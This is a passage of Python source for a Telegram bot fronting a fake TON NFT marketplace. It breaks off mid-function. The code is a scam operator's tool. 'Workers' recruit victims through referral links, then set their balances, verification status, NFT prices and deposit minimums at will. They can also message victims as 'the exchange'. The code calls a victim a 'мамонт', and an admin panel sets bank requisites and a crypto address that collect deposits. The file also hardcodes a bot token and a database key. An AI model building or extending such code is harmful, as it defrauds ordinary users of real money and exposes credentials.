import asyncio
import logging
import os
from typing import Optional, Any
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from supabase import create_client, Client

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# --- Конфигурация (все значения в коде, без .env) ---
BOT_TOKEN = "8683208045:AAFVylIpOyWxHyrEVZqdybSlLe4eAkc3COY"
MINI_APP_URL = "https://nft-livid-xi.vercel.app/"
SUPABASE_URL = "https://bfwvifusfewekcxtnjar.supabase.co"
SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJmd3ZpZnVzZmV3ZWtjeHRuamFyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MjkyNDksImV4cCI6MjA4NzUwNTI0OX0.enRGKEp2ya1CvkXb8yfCOmU-jG5TJlJ05rLXaZmhxno"
ADMIN_IDS_RAW = "6935385024"
SUPPORT_USERNAME_FALLBACK = ""

# Лимиты списка рефералов: короткие подписи и пагинация — кнопки стабильно тапаются
REFS_PAGE_SIZE = 12
REFS_BUTTONS_PER_ROW = 2
MAX_REF_BUTTON_LABEL = 28

ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_RAW.split(",") if x.strip()]


def escape_markdown(text: str) -> str:
    """Экранирует символы Markdown (_*`) в пользовательском тексте."""
    if not text:
        return text
    for ch in ("_", "*", "`"):
        text = text.replace(ch, "\\" + ch)
    return text


def _is_ref_of_worker(ref_user: Optional[dict], worker_id: int) -> bool:
    """Проверяет, что ref_user — реферал данного воркера. Учитывает referrer_id как int и str из БД."""
    if not ref_user:
        return False
    r = ref_user.get("referrer_id")
    if r is None:
        return False
    try:
        return int(r) == worker_id
    except (TypeError, ValueError):
        return False


if not BOT_TOKEN:
    logging.error("Задайте BOT_TOKEN в коде (bot.py)")
    exit(1)

# Инициализация бота и диспетчера
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Инициализация Supabase
supabase: Optional[Client] = None
if SUPABASE_URL and SUPABASE_ANON_KEY:
    try:
        supabase = create_client(SUPABASE_URL, SUPABASE_ANON_KEY)
        logging.info("Supabase подключён")
    except Exception as e:
        logging.error("Ошибка подключения к Supabase: %s", e)
        supabase = None
else:
    logging.warning("SUPABASE_URL или SUPABASE_ANON_KEY не заданы")

COUNTRIES = [
    {"id": "ru", "label": "Россия"},
]

WELCOME_TEXT = """🖼 *Ethos Gallery* — маркетплейс NFT в сети TON

✨ *Что внутри:*
• Покупка и продажа NFT
• Пополнение и вывод в фиат — RUB (Россия)
• Коллекции: Ethos Classics, Neon Drop, Genesis
• Сезоны с призами и наградами

👇 _Нажмите кнопку ниже, чтобы открыть приложение_"""

# Путь к баннеру при старте (относительно папки, где лежит bot.py — работает и локально, и на сервере)
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WELCOME_IMAGE_PATH = os.path.join(_BASE_DIR, "image.png")

# --- FSM Состояния (замена Map из JS) ---
class WorkerState(StatesGroup):
    min_deposit = State()
    min_withdraw = State()
    balance_ref = State()
    message_ref = State()
    nft_price_code = State()
    nft_price_value = State()
    nft_duo_code = State()
    ref_nft_price_code = State()
    ref_nft_price_value = State()
    add_client = State()

class AdminState(StatesGroup):
    requisites = State()
    support = State()
    crypto_address = State()
    bot_link = State()
    min_deposit_ton = State()
    min_withdraw_ton = State()
    nft_image = State()
    nft_name = State()
    nft_code = State()
    nft_price = State()
    nft_model = State()
    nft_collection = State()
    nft_backdrop = State()
    nft_duo = State()
    nft_name = State()
    nft_code = State()
    nft_price = State()
    nft_model = State()
    nft_collection = State()
    nft_backdrop = State()
    nft_duo = State()

# --- Вспомогательные функции ---
def is_admin(user_id: int) -> bool:
    return len(ADMIN_IDS) > 0 and user_id in ADMIN_IDS

def generate_referral_code(user_id: int) -> str:
    # Аналог toString(36) из JS (Base36)
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    res = ''
    n = user_id
    while n > 0:
        n, r = divmod(n, 36)
        res = chars[r] + res
    return res.rjust(8, '0')

async def support_url() -> str:
    val = await get_setting("support_username")
    username = (val or SUPPORT_USERNAME_FALLBACK or "").strip().lstrip("@")
    return f"https://t.me/{username}" if username else "https://t.me/"

# --- Функции БД (Supabase) ---
async def upsert_setting(key: str, value: Any):
    if not supabase: return {"error": "Supabase не настроен"}
    try:
        row = {"setting_key": key, "setting_value": str(value)}
        supabase.table("system_settings").upsert(row, on_conflict="setting_key").execute()
        return {"error": None}
    except Exception as e:
        return {"error": str(e)}

async def get_setting(key: str):
    if not supabase:
        return None
    try:
        response = supabase.table("system_settings").select("setting_value").eq("setting_key", key).execute()
        if response.data and len(response.data) > 0:
            return response.data[0].get("setting_value")
    except Exception as e:
        logging.debug("get_setting %s: %s", key, e)
    return None

async def get_user_by_referral_code(code: str):
    if not supabase or not code:
        return None
    try:
        response = supabase.table("users").select("id").eq("referral_code", str(code).strip().upper()).execute()
        return response.data[0] if response.data else None
    except Exception as e:
        logging.debug("get_user_by_referral_code: %s", e)
        return None

async def ensure_user(telegram_id: int, referrer_id: Optional[int], username: Optional[str], first_name: Optional[str], photo_url: Optional[str]):
    """Создать или обновить пользователя. Возвращает (user_dict или None, just_attached: bool).
    just_attached = True если пользователь только что привязан к рефереру (новый или обновлён referrer_id)."""
    if not supabase:
        return None, False
    try:
        response = supabase.table("users").select("*").eq("id", telegram_id).execute()
        existing = response.data[0] if response.data else None
        just_attached = False

        if existing:
            if referrer_id is not None and existing.get("referrer_id") is None:
                supabase.table("users").update({"referrer_id": referrer_id}).eq("id", telegram_id).execute()
                existing["referrer_id"] = referrer_id
                just_attached = True
            return existing, just_attached

        referral_code = generate_referral_code(telegram_id)
        row = {
            "id": telegram_id,
            "username": username,
            "first_name": first_name,
            "avatar_url": photo_url,
            "referral_code": referral_code,
            "balance": 0,
            "referrer_id": referrer_id,
        }
        inserted = supabase.table("users").insert(row).execute()
        data = inserted.data[0] if inserted.data else None
        just_attached = referrer_id is not None
        return data, just_attached
    except Exception as e:
        logging.exception("ensure_user: %s", e)
        return None, False

async def get_user(telegram_id: int):
    if not supabase:
        return None
    try:
        response = supabase.table("users").select("*").eq("id", telegram_id).execute()
        return response.data[0] if response.data else None
    except Exception as e:
        logging.debug("get_user %s: %s", telegram_id, e)
        return None


async def get_user_by_username(username: str):
    """Найти пользователя по нику (с @ или без). Без учёта регистра. Возвращает dict или None."""
    if not supabase or not username: return None
    raw = str(username).strip().lstrip("@").strip()
    if not raw: return None
    try:
        r = supabase.table("users").select("*").ilike("username", raw).limit(1).execute()
        if r.data:
            return r.data[0]
        r = supabase.table("users").select("*").eq("username", raw).limit(1).execute()
        return r.data[0] if r.data else None
    except Exception:
        try:
            r = supabase.table("users").select("*").eq("username", raw).limit(1).execute()
            return r.data[0] if r.data else None
        except Exception:
            return None

async def get_referrals(referrer_id: int):
    if not supabase:
        return []
    try:
        response = (
            supabase.table("users")
            .select("id, username, first_name, balance, created_at")
            .eq("referrer_id", referrer_id)
            .order("created_at", desc=True)
            .execute()
        )
        return response.data or []
    except Exception as e:
        logging.debug("get_referrals %s: %s", referrer_id, e)
        return []

async def update_user_fields(telegram_id: int, fields: dict):
    if not supabase: return {"error": "Supabase не настроен"}
    try:
        supabase.table("users").update(fields).eq("id", telegram_id).execute()
        return {"error": None}
    except Exception as e:
        return {"error": str(e)}

async def get_verification_status(telegram_id: int) -> Optional[str]:
    """Возвращает 'active', 'passive' или None."""
    val = await get_setting(f"user_{telegram_id}_verification_status")
    if val in ("active", "passive"):
        return val
    return None

async def is_user_verified(telegram_id: int) -> bool:
    status = await get_verification_status(telegram_id)
    return status in ("active", "passive")

async def get_nft_catalog_item(code: str):
    if not supabase:
        return None
    try:
        response = supabase.table("nft_catalog").select("*").eq("code", str(code).strip()).execute()
        return response.data[0] if response.data else None
    except Exception as e:
        logging.debug("get_nft_catalog_item %s: %s", code, e)
        return None

async def update_nft_catalog_price(code: str, price: float):
    if not supabase: return {"error": "Supabase не настроен"}
    try:
        supabase.table("nft_catalog").update({"price": float(price)}).eq("code", str(code).strip()).execute()
        return {"error": None}
    except Exception as e:
        return {"error": str(e)}


def _referral_nft_price_key(ref_id: int, code: str) -> str:
    return f"nft_price_ref_{ref_id}_{code.strip()}"


async def get_referral_nft_price(ref_id: int, code: str):
    """Цена NFT для конкретного реферала (переопределение каталога). Возвращает float или None."""
    v = await get_setting(_referral_nft_price_key(ref_id, code))
    if v is None: return None
    try:
        return float(v)
    except (TypeError, ValueError):
        return None


async def set_referral_nft_price(ref_id: int, code: str, price: float):
    """Установить цену NFT только для этого реферала."""
    await upsert_setting(_referral_nft_price_key(ref_id, code), str(price))


async def get_referral_nft_prices(ref_id: int) -> dict:
    """Все переопределённые цены NFT для реферала: { code: price }."""
    if not supabase: return {}
    try:
        prefix = f"nft_price_ref_{ref_id}_"
        try:
            r = supabase.table("system_settings").select("setting_key, setting_value").filter("setting_key", "like", f"{prefix}%").execute()
        except Exception:
            r = supabase.table("system_settings").select("setting_key, setting_value").execute()
        out = {}
        for row in (r.data or []):
            k = row.get("setting_key") or ""
            if k.startswith(prefix):
                code = k[len(prefix):]
                try:
                    out[code] = float(row.get("setting_value") or 0)
                except (TypeError, ValueError):
                    pass
        return out
    except Exception:
        return {}

async def set_nft_catalog_duo(code: str):
    if not supabase: return {"error": "Supabase не настроен"}
    try:
        supabase.table("nft_catalog").update({"is_duo": True}).eq("code", str(code).strip()).execute()
        return {"error": None}
    except Exception as e:
        return {"error": str(e)}

async def insert_nft_catalog(
    code: str,
    name: str,
    image: str,
    price: float,
    is_duo: bool = False,
    model: Optional[str] = None,
    collection: Optional[str] = None,
    backdrop: Optional[str] = None,
):
    if not supabase: return {"error": "Supabase не настроен"}
    try:
        row = {
            "code": str(code).strip(),
            "name": str(name).strip(),
            "image": str(image).strip(),
            "price": float(price),
            "is_duo": bool(is_duo),
        }
        if model is not None: row["model"] = str(model).strip() or None
        if collection is not None: row["collection"] = str(collection).strip() or None
        if backdrop is not None: row["backdrop"] = str(backdrop).strip() or None
        supabase.table("nft_catalog").insert(row).execute()
        return {"error": None}
    except Exception as e:
        return {"error": str(e)}


# --- Листинги: уведомление воркера и подтверждение продажи ---
async def get_pending_listings():
    """Листинги со статусом pending, по которым ещё не отправили уведомление воркеру."""
    if not supabase:
        return []
    try:
        r = supabase.table("nft_listings").select("*").eq("status", "pending").eq("worker_notified", False).execute()
        return r.data or []
    except Exception:
        return []


def get_listing_by_id(listing_id: int):
    if not supabase:
        return None
    try:
        r = supabase.table("nft_listings").select("*").eq("id", listing_id).single().execute()
        return r.data
    except Exception:
        return None


def get_referrer_id(seller_id: int) -> Optional[int]:
    """ID воркера (реферера) по seller_id. Всегда int или None."""
    if not supabase:
        return None
    try:
        r = supabase.table("users").select("referrer_id").eq("id", seller_id).single().execute()
        if not r.data:
            return None
        ref = r.data.get("referrer_id")
        if ref is None:
            return None
        return int(ref)
    except (ValueError, TypeError):
        return None
    except Exception:
        return None


def mark_listing_worker_notified(listing_id: int):
    if not supabase:
        return False
    try:
        supabase.table("nft_listings").update({"worker_notified": True}).eq("id", listing_id).execute()
        return True
    except Exception:
        return False


def remove_one_user_nft(seller_id: int, nft_id: str) -> bool:
    """Удалить одну копию NFT у пользователя (для подтверждения продажи)."""
    if not supabase:
        return False
    try:
        r = (
            supabase.table("user_nfts")
            .select("id")
            .eq("user_id", seller_id)
            .eq("nft_id", nft_id)
            .order("id", desc=False)
            .limit(1)
            .execute()
        )
        if not r.data or len(r.data) == 0:
            return False
        row_id = r.data[0]["id"]
        supabase.table("user_nfts").delete().eq("id", row_id).execute()
        return True
    except Exception:
        return False


def execute_listing_sale(listing_id: int) -> Optional[str]:
    """
    Подтвердить продажу: status=sold, удалить 1 или 2 user_nft (дуо), начислить баланс, записать транзакцию.
    """
    if not supabase:
        return "Supabase не настроен"
    listing = get_listing_by_id(listing_id)
    if not listing:
        return "Листинг не найден"
    if listing.get("status") != "pending":
        return "Листинг уже обработан"
    seller_id = int(listing["seller_id"])
    nft_id = str(listing["nft_id"])
    price = float(listing["price"])
    nft_title = str(listing.get("nft_title") or "")

    # Дуо: в листинге price уже общая сумма за пару, снимаем 2 NFT
    is_duo = False
    try:
        cat = supabase.table("nft_catalog").select("is_duo").eq("code", nft_id).single().execute()
        is_duo = bool(cat.data.get("is_duo") if cat.data else False)
    except Exception:
        pass
    quantity = 2 if is_duo else 1

    # Текущий баланс продавца
    try:
        user_r = supabase.table("users").select("balance").eq("id", seller_id).single().execute()
        current_balance = float(user_r.data.get("balance", 0) or 0) if user_r.data else 0
    except Exception:
        return "Не удалось прочитать баланс"

    # 1. Обновить листинг: status = sold
    try:
        supabase.table("nft_listings").update({"status": "sold"}).eq("id", listing_id).execute()
    except Exception as e:
        return f"Ошибка обновления листинга: {e}"

    # 2. Удалить одну или две копии NFT у продавца
    for _ in range(quantity):
        if not remove_one_user_nft(seller_id, nft_id):
            return "Не удалось удалить NFT у пользователя"

    # 3. Начислить баланс (price в листинге для дуо уже общая сумма за пару)
    new_balance = round(current_balance + price, 4)
    try:
        supabase.table("users").update({"balance": new_balance}).eq("id", seller_id).execute()
    except Exception as e:
        return f"Ошибка обновления баланса: {e}"

    # 4. Транзакция «продажа»
    try:
        title = f"Продажа пары: {nft_title}" if quantity == 2 else f"Продажа: {nft_title}"
        supabase.table("transactions").insert({
            "user_id": seller_id,
            "type": "sell",
            "title": title,
            "amount": price,
            "nft_id": nft_id,
            "nft_title": nft_title,
        }).execute()
    except Exception:
        pass  # не блокируем успех

    return None


# --- Хэндлеры команд ---

@dp.message(CommandStart())
async def cmd_start(message: types.Message, command: Command):
    user_id = message.from_user.id
    ref_code = command.args.strip() if command.args else ""
    referrer_id = None

    if ref_code and supabase:
        referrer = await get_user_by_referral_code(ref_code)
        if referrer:
            referrer_id = referrer.get("id")

    if supabase:
        user, just_attached = await ensure_user(user_id, referrer_id, message.from_user.username, message.from_user.first_name, None)
        if referrer_id and just_attached:
            try:
                name = message.from_user.full_name or message.from_user.username or "—"
                username = f"@{message.from_user.username}" if message.from_user.username else "—"
                await bot.send_message(
                    referrer_id,
                    f"👤 *По вашей реферальной ссылке зашёл новый пользователь*\n\n"
                    f"Имя: {name}\nНик: {username}\nID: `{user_id}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Открыть приложение", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text="💬 Техподдержка", url=await support_url())]
    ])

    if os.path.isfile(WELCOME_IMAGE_PATH):
        try:
            photo = FSInputFile(WELCOME_IMAGE_PATH)
            await message.answer_photo(photo, caption=WELCOME_TEXT, parse_mode="Markdown", reply_markup=keyboard)
        except Exception as e:
            logging.warning("Welcome image not sent: %s", e)
            await message.answer(WELCOME_TEXT, parse_mode="Markdown", reply_markup=keyboard)
    else:
        await message.answer(WELCOME_TEXT, parse_mode="Markdown", reply_markup=keyboard)

@dp.message(Command("worker"))
async def cmd_worker(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if not supabase:
        await message.answer("Сервис временно недоступен (база данных не подключена). Попробуйте позже.")
        await state.clear()
        return
    await state.clear()
    user, _ = await ensure_user(user_id, None, message.from_user.username, message.from_user.first_name, None)
    if not user:
        await message.answer("Не удалось загрузить данные. Попробуйте позже.")
        return
    msg, keyboard = await build_worker_panel(user_id, user)
    await message.answer(msg, parse_mode="Markdown", reply_markup=keyboard)


async def build_worker_panel(user_id: int, user: dict):
    """Собрать текст и клавиатуру панели воркера."""
    bot_info = await bot.get_me()
    bot_username = bot_info.username
    ref_link = f"https://t.me/{bot_username}?start={user.get('referral_code')}"
    min_dep = await get_setting(f"worker_{user_id}_min_deposit_ton")
    min_wd = await get_setting(f"worker_{user_id}_min_withdraw_ton")
    ref_count = len(await get_referrals(user_id))
    msg = (f"👷 *Панель воркера*\n\n"
           f"🔗 Ваша реферальная ссылка:\n`{ref_link}`\n\n"
           f"👥 Рефералов: *{ref_count}*\n"
           f"📥 Мин. депозит для ваших рефералов: *{min_dep or 'глобальный'}* TON\n"
           f"📤 Мин. вывод для ваших рефералов: *{min_wd or 'глобальный'}* TON")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Мои рефералы", callback_data="worker_referrals")],
        [InlineKeyboardButton(text="➕ Добавить клиента по нику/ID", callback_data="worker_add_client")],
        [InlineKeyboardButton(text="🔄 Создать дуо-токен", callback_data="worker_nft_duo")],
        [InlineKeyboardButton(text="📥 Мин. депозит для ваших рефералов", callback_data="worker_min_deposit")],
        [InlineKeyboardButton(text="📤 Мин. вывод для ваших рефералов", callback_data="worker_min_withdraw")],
    ])
    return msg, keyboard


def quick_actions_worker_main():
    """Клавиатура быстрых действий: вернуться в главное меню воркера."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 В главное меню", callback_data="worker_back_panel")]
    ])


def _ref_button_label(u: dict) -> str:
    """Короткая подпись для кнопки реферала (лимит длины — стабильный тап в Telegram)."""
    raw = f"@{u['username']}" if u.get("username") else (u.get("first_name") or f"ID {u['id']}")
    s = (raw or "").strip()
    if len(s) > MAX_REF_BUTTON_LABEL:
        return s[: MAX_REF_BUTTON_LABEL - 1] + "…"
    return s or f"ID {u['id']}"


def build_referrals_keyboard(refs: list, page: int = 0):
    """Клавиатура списка рефералов: по 2 кнопки в ряд, пагинация."""
    total = len(refs)
    total_pages = max(1, (total + REFS_PAGE_SIZE - 1) // REFS_PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * REFS_PAGE_SIZE
    chunk = refs[start : start + REFS_PAGE_SIZE]

    rows = []
    for i in range(0, len(chunk), REFS_BUTTONS_PER_ROW):
        row_refs = chunk[i : i + REFS_BUTTONS_PER_ROW]
        row = [
            InlineKeyboardButton(text=f"👤 {_ref_button_label(u)}", callback_data=f"worker_profile_{u['id']}")
            for u in row_refs
        ]
        rows.append(row)

    if total_pages > 1:
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton(text="◀ Назад", callback_data=f"worker_refpage_{page - 1}"))
        if page < total_pages - 1:
            nav.append(InlineKeyboardButton(text="Далее ▶", callback_data=f"worker_refpage_{page + 1}"))
        if nav:
            rows.append(nav)
    rows.append([InlineKeyboardButton(text="🔙 В панель воркера", callback_data="worker_back_panel")])

    return InlineKeyboardMarkup(inline_keyboard=rows), page, total_pages, total


def quick_actions_worker_ref(ref_id: int):
    """Клавиатура быстрых действий: главное меню или профиль реферала."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔙 В главное меню", callback_data="worker_back_panel"),
            InlineKeyboardButton(text="🔙 К профилю реферала", callback_data=f"worker_profile_{ref_id}")
        ]
    ])


async def build_ref_profile_msg_kb(ref_id: int, ref_user: dict, worker_id: int):
    """Собрать текст и клавиатуру профиля реферала."""
    first_name = ref_user.get("first_name") or "—"
    username = f"@{ref_user['username']}" if ref_user.get("username") else "—"
    balance = float(ref_user.get("balance") or 0)
    has_avatar = bool(ref_user.get("avatar_url"))
    verified = await get_verification_status(ref_id)
    verif_text = "пройдена" if verified in ("active", "passive") else "нет"
    ref_prices = await get_referral_nft_prices(ref_id)
    ref_prices_str = ", ".join(f"{c}={p} TON" for c, p in list(ref_prices.items())[:5]) if ref_prices else "—"
    if len(ref_prices) > 5:
        ref_prices_str += f" (+{len(ref_prices) - 5})"
    msg = (f"👤 *Профиль реферала*\n\n"
           f"Имя: {first_name}\nНик: {username}\nАватар: {'есть' if has_avatar else 'нет'}\n"
           f"ID: `{ref_id}`\n💰 Баланс: *{balance}* TON\n✅ Верификация: *{verif_text}*\n"
           f"💰 Цены NFT для реферала: {ref_prices_str}\n\n"
           f"_Изменить баланс, верификацию и цены NFT — кнопки ниже._")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Изменить баланс", callback_data=f"worker_balance_{ref_id}")],
        [
            InlineKeyboardButton(text="✅ Дать вериф", callback_data=f"worker_verify_{ref_id}"),
            InlineKeyboardButton(text="❌ Забрать вериф", callback_data=f"worker_unverify_{ref_id}")
        ],
        [InlineKeyboardButton(text="💰 Цена NFT для реферала", callback_data=f"worker_ref_nft_price_{ref_id}")],
        [InlineKeyboardButton(text="📩 Написать в бот", callback_data=f"worker_message_{ref_id}")],
        [InlineKeyboardButton(text="🔙 К списку рефералов", callback_data="worker_referrals")]
    ])
    return msg, kb

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("Нет доступа.")
        return
    await state.clear()
    if not supabase:
        await message.answer("⚠️ База данных не подключена. Функции админки могут не работать.")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Реквизиты РФ (для пополнения)", callback_data="admin_req_ru")],
        [InlineKeyboardButton(text="🪙 Адрес USDT в сети TON", callback_data="admin_crypto_address")],
    ])
    await message.answer("⚙️ *Админ-панель*", parse_mode="Markdown", reply_markup=keyboard)


# --- Обработчики Callbacks ---
@dp.callback_query()
async def process_callback(call: types.CallbackQuery, state: FSMContext):
    data = call.data
    user_id = call.from_user.id
    try:
        if data.startswith("worker_profile_"):
            await call.answer("Открываю профиль…")
        else:
            await call.answer()
    except Exception:
        pass

    try:
        await _process_callback(call, state, data, user_id)
    except Exception as e:
        logging.exception("process_callback: %s", e)
        try:
            await call.message.answer("Произошла ошибка. Попробуйте ещё раз или напишите /worker.")
        except Exception:
            pass


async def _process_callback(call: types.CallbackQuery, state: FSMContext, data: str, user_id: int):

    # Worker callbacks
    if data == "worker_referrals":
        if not supabase:
            await call.message.answer("База данных недоступна. Список рефералов временно недоступен.")
            return
        try:
            refs = await get_referrals(user_id)
            if not refs:
                try:
                    await call.message.edit_text(
                        "👥 *Мои рефералы*\n\nПо вашей реферальной ссылке ещё никто не зашёл.",
                        parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="🔙 В панель воркера", callback_data="worker_back_panel")]
                        ])
                    )
                except Exception:
                    await call.message.answer(
                        "По вашей реферальной ссылке ещё никто не зашёл.",
                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="🔙 В панель воркера", callback_data="worker_back_panel")]
                        ])
                    )
                return
            kb, page, total_pages, total = build_referrals_keyboard(refs, 0)
            msg = f"👥 *Ваши рефералы* ({total}) — нажмите на имя, чтобы открыть профиль:"
            if total_pages > 1:
                msg += f"\n_Страница 1 из {total_pages}_"
            try:
                await call.message.edit_text(msg, parse_mode="Markdown", reply_markup=kb)
            except Exception:
                await call.message.answer(msg, parse_mode="Markdown", reply_markup=kb)
        except Exception as e:
            logging.exception("worker_referrals: %s", e)
            await call.message.answer("Ошибка загрузки рефералов. Попробуйте позже.")

    elif data.startswith("worker_refpage_"):
        if not supabase:
            await call.message.answer("База данных недоступна.")
            return
        try:
            page_str = data.replace("worker_refpage_", "").strip()
            page = int(page_str) if page_str.isdigit() else 0
        except (ValueError, TypeError):
            page = 0
        try:
            refs = await get_referrals(user_id)
            if not refs:
                await call.answer("Список пуст.")
                return
            kb, page, total_pages, total = build_referrals_keyboard(refs, page)
            msg = f"👥 *Ваши рефералы* ({total}) — нажмите на имя, чтобы открыть профиль:"
            if total_pages > 1:
                msg += f"\n_Страница {page + 1} из {total_pages}_"
            try:
                await call.message.edit_text(msg, parse_mode="Markdown", reply_markup=kb)
            except Exception:
                await call.message.answer(msg, parse_mode="Markdown", reply_markup=kb)
        except Exception as e:
            logging.exception("worker_refpage: %s", e)
            await call.message.answer("Ошибка. Попробуйте /worker → Мои рефералы.")

    elif data == "worker_back_panel":
        if not supabase:
            await call.message.answer("База данных недоступна. Попробуйте позже.")
            return
        try:
            user = await get_user(user_id)
            if not user:
                await call.message.answer("Не удалось загрузить данные.")
                return
            msg, keyboard = await build_worker_panel(user_id, user)
            try:
                await call.message.edit_text(msg, parse_mode="Markdown", reply_markup=keyboard)
            except Exception:
                await call.message.answer(msg, parse_mode="Markdown", reply_markup=keyboard)
        except Exception as e:
            logging.exception("worker_back_panel: %s", e)
            await call.message.answer("Ошибка. Напишите /worker заново.")

    elif data.startswith("worker_profile_"):
        ref_id_str = data[len("worker_profile_"):].strip()
        try:
            ref_id = int(ref_id_str) if ref_id_str.isdigit() else 0
        except (ValueError, TypeError):
            ref_id = 0
        if not ref_id:
            await call.message.answer("Ошибка: неверные данные кнопки.")
            return
        try:
            ref_user = await get_user(ref_id)
            if not _is_ref_of_worker(ref_user, user_id):
                await call.message.answer("Реферал не найден или доступ запрещён.")
                return
            msg, kb = await build_ref_profile_msg_kb(ref_id, ref_user, user_id)
            try:
                await call.message.edit_text(msg, parse_mode="Markdown", reply_markup=kb)
            except Exception:
                await call.message.answer(msg, parse_mode="Markdown", reply_markup=kb)
        except Exception as e:
            logging.exception("worker_profile_ %s: %s", ref_id, e)
            await call.message.answer("Не удалось открыть профиль. Попробуйте ещё раз или /worker.")

    elif data.startswith("worker_balance_"):
        try:
            ref_id = int(data.split("_")[2])
        except (IndexError, ValueError):
            await call.message.answer("Ошибка данных.")
            return
        await state.set_state(WorkerState.balance_ref)
        await state.update_data(referral_id=ref_id)
        try:
            await call.message.edit_text("💰 Введите новый баланс (TON) для реферала:")
        except Exception:
            await call.message.answer("Введите новый баланс (TON) для реферала:")

    elif data.startswith("worker_verify_"):
        try:
            ref_id = int(data.split("_")[2])
        except (IndexError, ValueError):
            await call.message.answer("Ошибка данных.")
            return
        ref_user = await get_user(ref_id)
        if not _is_ref_of_worker(ref_user, user_id):
            await call.message.answer("Реферал не найден или доступ запрещён.")
            return
        await upsert_setting(f"user_{ref_id}_verification_status", "active")
        ref_user = await get_user(ref_id)
        msg, kb = await build_ref_profile_msg_kb(ref_id, ref_user, user_id)
        try:
            await call.message.edit_text(msg, parse_mode="Markdown", reply_markup=kb)
        except Exception:
            await call.message.answer(msg, parse_mode="Markdown", reply_markup=kb)

    elif data.startswith("worker_unverify_"):
        try:
            ref_id = int(data.split("_")[2])
        except (IndexError, ValueError):
            await call.message.answer("Ошибка данных.")
            return
        ref_user = await get_user(ref_id)
        if not _is_ref_of_worker(ref_user, user_id):
            await call.message.answer("Реферал не найден или доступ запрещён.")
            return
        if supabase:
            try:
                supabase.table("system_settings").delete().eq("setting_key", f"user_{ref_id}_verification_status").execute()
            except Exception:
                pass
        ref_user = await get_user(ref_id)
        msg, kb = await build_ref_profile_msg_kb(ref_id, ref_user, user_id)
        try:
            await call.message.edit_text(msg, parse_mode="Markdown", reply_markup=kb)
        except Exception:
            await call.message.answer(msg, parse_mode="Markdown", reply_markup=kb)

    elif data.startswith("worker_ref_nft_price_"):
        try:
            ref_id = int(data.split("_")[4])
        except (IndexError, ValueError):
            await call.message.answer("Ошибка данных.")
            return
        ref_user = await get_user(ref_id)
        if not _is_ref_of_worker(ref_user, user_id):
            await call.message.answer("Реферал не найден или доступ запрещён.")
            return
        await state.set_state(WorkerState.ref_nft_price_code)
        await state.update_data(referral_id=ref_id)
        try:
            await call.message.edit_text(
                "💰 *Цена NFT только для этого реферала*\n\nВведите код NFT из каталога (например, код из Supabase):",
                parse_mode="Markdown"
            )
        except Exception:
            await call.message.answer(
                "💰 Цена NFT только для этого реферала.\n\nВведите код NFT из каталога:"
            )

    elif data.startswith("worker_message_"):
        try:
            ref_id = int(data.split("_")[2])
        except (IndexError, ValueError):
            await call.message.answer("Ошибка данных.")
            return
        ref_user = await get_user(ref_id)
        if not _is_ref_of_worker(ref_user, user_id):
            await call.message.answer("Реферал не найден или доступ запрещён.")
            return
        await state.set_state(WorkerState.message_ref)
        await state.update_data(referral_id=ref_id)
        try:
            await call.message.edit_text("📩 Введите текст сообщения — оно придёт рефералу в бот от имени биржи:")
        except Exception:
            await call.message.answer("Введите текст сообщения — оно придёт рефералу в бот от имени биржи:")

    elif data.startswith("confirm_listing_"):
        try:
            listing_id = int(data.split("_")[2])
        except (IndexError, ValueError):
            await call.message.answer("Ошибка данных.")
            return
        listing = get_listing_by_id(listing_id)
        if not listing:
            await call.message.answer("Листинг не найден.")
            return
        if listing.get("status") != "pending":
            await call.message.answer("Этот листинг уже обработан.")
            return
        referrer_id = get_referrer_id(int(listing["seller_id"]))
        if referrer_id != user_id:
            await call.message.answer("Подтверждать может только воркер этого реферала.")
            return
        err = execute_listing_sale(listing_id)
        if err:
            await call.message.answer(f"Ошибка: {err}")
            return
        seller_id = int(listing["seller_id"])
        nft_title = listing.get("nft_title") or "NFT"
        price = listing.get("price") or 0
        await call.message.answer(
            f"✅ *Продажа подтверждена.*\n\n"
            f"NFT: {nft_title}\n"
            f"Цена: {price} TON\n"
            f"Продавец (ID): {seller_id}\n\n"
            f"У мамонта на сайте NFT снят с портфеля и баланс пополнен в реальном времени.",
            parse_mode="Markdown"
        )
        try:
            await bot.send_message(
                int(listing["seller_id"]),
                f"✅ Ваш NFT «{nft_title}» продан на {price} TON.\n"
                "Средства зачислены на баланс в приложении."
            )
        except Exception:
            pass
        try:
            await bot.send_message(
                referrer_id,
                f"📤 *Лог:* реферал ID {seller_id} продал NFT «{nft_title}» за {price} TON.",
                parse_mode="Markdown"
            )
        except Exception:
            pass

    elif data == "worker_nft_price":
        await state.set_state(WorkerState.nft_price_code)
        try:
